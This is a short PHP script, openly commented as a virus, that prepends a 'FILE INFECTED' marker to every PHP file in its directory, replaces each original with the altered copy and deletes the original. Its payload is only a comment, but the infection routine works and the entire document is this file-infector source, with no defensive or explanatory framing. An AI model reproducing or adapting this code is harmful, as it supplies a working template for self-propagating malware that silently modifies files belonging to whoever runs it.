<?php //FILE INFECTED ?>
<?php
$infection = '<?php //FILE INFECTED ?>' . PHP_EOL; // VIRUS
$fileNames = glob('*.php'); // Get a list of all php files

foreach ($fileNames as $fileName) { // Check each file
    $script = fopen($fileName, 'r'); // Open file
    $infected = fopen($fileName . '.infected', 'w'); // Let's write to a new file

    fputs($infected, $infection, strlen($infection));

    while ($contents = fgets($script)) {
        fputs($infected, $contents, strlen($contents));
    }

    fclose($script); //close both handles
    fclose($infected);

    rename($fileName, $fileName . '.original'); // Move the infected file in to place
    rename($fileName . '.infected', $fileName);

    unlink($fileName . '.original');
}
